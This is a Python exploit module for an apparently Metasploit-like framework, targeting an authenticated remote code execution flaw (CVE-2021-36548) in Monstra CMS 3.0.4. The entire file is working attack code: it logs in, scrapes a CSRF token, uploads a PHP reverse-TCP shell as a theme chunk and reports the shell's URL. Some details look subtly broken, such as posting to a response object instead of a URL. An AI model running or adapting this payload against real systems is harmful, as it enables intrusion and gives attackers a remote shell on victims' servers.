#######
# Module/Exploit: Monstra CMS Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitExploit(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'exploit',
                'Name' : 'Monstra CMS Authenticated Remote Code Execution',
                'Module Author' : 'Handler4',
                'Exploit Author' : 'Ahmet Ãœmit BAYRAM',
                'Version' : '3.0.4',
                'CVE' : 'CVE-2021-36548',
                'NVD' : 'https://nvd.nist.gov/vuln/detail/CVE-2021-36548',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52038',
                
                'Description' : [
                    'A remote code execution (RCE) vulnerability in the component /admin/index.php?',
                    'id=themes&action=edit_template&filename=blog of Monstra v3.0.4 allows attackers',
                    'to execute arbitrary commands via a crafted PHP file.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('username','none',['','yes','username to use for authentication']),
            OptString.new('password','none',['','yes','password to use for authentication'])
        ])


    def exploit(self):
        try:
            target = self.GetOPT('target')
            username = self.GetOPT('username')
            password = self.GetOPT('password')
            rport = self.GetOPT('rport')
            shell = self.EncodeShell(self.encoder,self.payload.shell_content())
            
            scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
            rand = self.RandomName()

            url = f'{scheme}://{hostname}:{rport}'
            shell_url = f'{url}/public/themes/default/{rand}.chunk.php'
            Shell(shell_url).new()

            login = f'{url}/admin/index.php?id=dashboard'
            login_data = {'login':username,'password':password,'login_submit':'Log+In'}

            info_print ('Logging in...')
            login_user = HTTP.session.post(login, data=login_data)
            if 'Dashboard' in login_user.text:
                info_print ('Logged in successfully.',type='green')
            else:
                info_print ('Failed to login.',type='red')
                HTTP().new()
                return 'session', False
            
            info_print ('Accessing edit page to find CSRF token.')
            edit_url = HTTP.session.get(f"{url}/admin/index.php?id=themes&action=add_chunk")
            
            token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="(.*?)"',edit_url.text)
            if token_search:
                token = token_search.group(1)
            else:
                info_print ('Failed to find CSRF token.')
                HTTP().new()
                return 'session', False
            
            edit_data = {'csrf':token,'name':rand,'content':shell,'add_file':'Save'}
            print (f'Uploading shell: {hostname}')

            exploit = HTTP.session.post(edit_url, data=edit_data)
            if exploit.status_code in self.good_status_code():
                info_print (f'Status code: {exploit.status_code}',type='green')
                info_print (f'Shell uploaded: {shell_url}')
                HTTP().new()
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                HTTP().new()
                return 'session', False

        except Exception as error:
            info_print (error,type='red')
            HTTP().new()
            return 'exception', True